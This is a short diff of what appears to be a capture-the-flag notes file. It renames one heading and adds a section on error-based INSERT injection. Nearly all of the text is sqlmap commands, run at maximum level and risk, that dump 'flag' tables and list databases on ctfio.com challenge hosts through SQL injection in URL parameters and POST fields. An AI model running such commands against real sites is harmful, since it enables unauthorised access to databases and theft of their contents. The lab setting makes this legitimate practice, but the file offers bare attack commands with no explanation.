@@ -1,5 +1,5 @@
 ____
-# UNION
+# ERROR 
 
 ```bash
 sqlmap -u "https://3q6m7sai.eu1.ctfio.com/article?id=1" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_two
@@ -32,3 +32,10 @@ sqlmap -u "https://b2ybgm86.eu1.ctfio.com/api/checkuser?username=adam" --level 5
 ```bash
 sqlmap -u "https://64cul97j.eu1.ctfio.com/?email=test" --level 5 --risk 3 -p email --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_four
 ```
+
+# ERROR based INSERT
+
+```bash
+sqlmap -u "https://tfe6gbl8.eu1.ctfio.com/" --data='title=test&comment=test' --method POST --level 5 --risk 3 -p title --batch --threads 10 --dbms=mysql --dbs
+```
+
